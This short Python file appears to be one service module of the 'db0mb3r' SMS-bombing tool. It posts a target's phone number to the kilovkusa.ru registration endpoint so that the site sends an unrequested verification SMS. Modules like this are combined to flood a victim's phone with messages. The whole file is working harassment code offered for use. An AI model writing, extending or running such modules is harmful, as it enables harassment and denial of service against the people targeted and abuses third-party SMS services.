from db0mb3r.services.service import Service


class KiloVkusa(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://kilovkusa.ru/ajax.php",
            params={
                "block": "auth",
                "action": "send_register_sms_code",
                "data_type": "json",
            },
            data={"phone": self.format(self.formatted_phone, "* (***) ***-**-**")},
        )
